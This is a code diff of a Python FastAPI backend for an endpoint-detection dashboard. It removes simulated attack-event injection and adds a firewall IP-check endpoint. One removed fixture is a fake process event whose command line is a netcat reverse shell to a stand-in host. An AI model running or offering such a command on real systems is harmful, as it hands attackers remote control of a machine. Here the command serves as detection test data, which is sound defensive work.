@@ -3,7 +3,6 @@ from __future__ import annotations
 import asyncio
 import json
 import os
-import random
 import sqlite3
 from contextlib import asynccontextmanager
 from pathlib import Path
@@ -35,30 +34,6 @@ class AuthPayload(BaseModel):
         return email
 
 
-class ControlModePayload(BaseModel):
-    mode: str
-
-    @field_validator("mode")
-    @classmethod
-    def validate_mode(cls, value: str) -> str:
-        mode = value.strip().lower()
-        if mode not in {"manual", "autonomous"}:
-            raise ValueError("Mode must be manual or autonomous")
-        return mode
-
-
-class ScenarioPayload(BaseModel):
-    scenario: str = "auto"
-
-    @field_validator("scenario")
-    @classmethod
-    def validate_scenario(cls, value: str) -> str:
-        scenario = value.strip().lower()
-        if scenario not in {"auto", "auth_burst", "outbound", "process"}:
-            raise ValueError("Scenario must be auto, auth_burst, outbound, or process")
-        return scenario
-
-
 class AgentIntervalPayload(BaseModel):
     interval_seconds: float = Field(ge=5, le=3600)
 
@@ -86,9 +61,8 @@ if not watch_path.is_absolute():
     watch_path = BASE_DIR / watch_path
 edr_service = EDRService(watch_path=watch_path)
 control_state: dict[str, Any] = {
-    "mode": "manual",
+    "mode": "real_time",
     "last_run": None,
-    "last_scenario": None,
 }
 frontend_origins = [
     origin.strip()
@@ -98,67 +72,6 @@ frontend_origins = [
     ).split(",")
     if origin.strip()
 ]
-
-
-async def inject_auth_burst() -> None:
-    for _ in range(5):
-        await edr_service.ingest_event(
-            {
-                "source": "automation_controller",
-                "event_type": "auth",
-                "title": "failed_login",
-                "payload": {
-                    "username": "svc-admin",
-                    "outcome": "failed",
-                    "source_ip": "198.51.100.17",
-                },
-            }
-        )
-
-
-async def inject_outbound() -> None:
-    await edr_service.ingest_event(
-        {
-            "source": "automation_controller",
-            "event_type": "network",
-            "title": "network_connection_observed",
-            "payload": {
-                "remote_ip": "203.0.113.44",
-                "remote_port": 4444,
-                "local_address": "10.0.0.8:51515",
-                "remote_address": "203.0.113.44:4444",
-                "status": "ESTABLISHED",
-            },
-        }
-    )
-
-
-async def inject_process() -> None:
-    await edr_service.ingest_event(
-        {
-            "source": "automation_controller",
-            "event_type": "process",
-            "title": "process_observed",
-            "payload": {
-                "process_name": "nc",
-                "cmdline": "nc -e cmd.exe 203.0.113.44 4444",
-                "username": "lab-user",
-                "pid": 4242,
-            },
-        }
-    )
-
-
-async def run_scenario(scenario: str) -> str:
-    selected = scenario if scenario != "auto" else random.choice(["auth_burst", "outbound", "process"])
-    if selected == "auth_burst":
-        await inject_auth_burst()
-    elif selected == "outbound":
-        await inject_outbound()
-    else:
-        await inject_process()
-    control_state["last_scenario"] = selected
-    return selected
 
 
 @asynccontextmanager
@@ -263,13 +176,6 @@ async def get_control_state(user: dict[str, Any] = Depends(get_current_user)) ->
     return {**control_state, "agent": edr_service.agent_status()}
 
 
-@app.post("/api/control/mode")
-async def set_control_mode(payload: ControlModePayload, user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
-    del user
-    control_state["mode"] = payload.mode
-    return {**control_state, "agent": edr_service.agent_status()}
-
-
 @app.get("/api/agent")
 async def get_agent_status(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
     del user
@@ -338,30 +244,18 @@ async def unblock_firewall_ip(
         raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=str(exc)) from exc
 
 
-@app.post("/api/control/simulate")
-async def simulate_scenario(payload: ScenarioPayload, user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
+@app.post("/api/firewall/check-ip")
+async def check_firewall_ip(
+    payload: FirewallIpPayload,
+    user: dict[str, Any] = Depends(get_current_user),
+) -> dict[str, object]:
     del user
-    control_state["mode"] = "manual"
-    selected = await run_scenario(payload.scenario)
-    await asyncio.sleep(0.3)
-    control_state["last_run"] = "completed"
-    return {"status": "completed", "scenario": selected}
-
-
-@app.post("/api/control/autonomous-run")
-async def run_autonomous_cycle(payload: ScenarioPayload, user: dict[str, Any] = Depends(get_current_user)) -> dict[str, Any]:
-    del user
-    control_state["mode"] = "autonomous"
-    await edr_service.collect_once()
-    selected = await run_scenario(payload.scenario)
-    await asyncio.sleep(0.5)
-    control_state["last_run"] = "completed"
-    return {
-        "status": "completed",
-        "mode": control_state["mode"],
-        "scenario": selected,
-        "summary": edr_service.storage.summary(),
-    }
+    try:
+        return edr_service.check_ip_block(payload.ip_address, payload.direction)
+    except ValueError as exc:
+        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(exc)) from exc
+    except RuntimeError as exc:
+        raise HTTPException(status_code=status.HTTP_500_INTERNAL_SERVER_ERROR, detail=str(exc)) from exc
 
 
 @app.get("/api/status")
@@ -392,29 +286,22 @@ async def detections(limit: int = 100, user: dict[str, Any] = Depends(get_curren
 @app.get("/api/actions")
 async def actions(limit: int = 100, user: dict[str, Any] = Depends(get_current_user)) -> list[dict[str, Any]]:
     del user
-    return edr_service.storage.recent_actions(limit=min(limit, 500))
+    real_actions = [
+        action
+        for action in edr_service.storage.recent_actions(limit=500)
+        if action.get("details", {}).get("real_action") is True
+    ]
+    return real_actions[: min(limit, 500)]
 
 
 @app.post("/api/collect")
 async def collect_once(user: dict[str, Any] = Depends(get_current_user)) -> dict[str, str]:
     del user
-    control_state["mode"] = "manual"
+    control_state["mode"] = "real_time"
     await edr_service.collect_once()
     await asyncio.sleep(0.5)
     control_state["last_run"] = "completed"
     return {"status": "collection_triggered"}
-
-
-@app.post("/api/ingest")
-async def ingest(event: dict[str, Any], user: dict[str, Any] = Depends(get_current_user)) -> dict[str, str]:
-    del user
-    try:
-        await edr_service.ingest_event(event)
-        await asyncio.sleep(0.2)
-    except Exception as exc:
-        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(exc)) from exc
-    control_state["last_run"] = "completed"
-    return {"status": "ingested"}
 
 
 @app.post("/api/reload-rules")
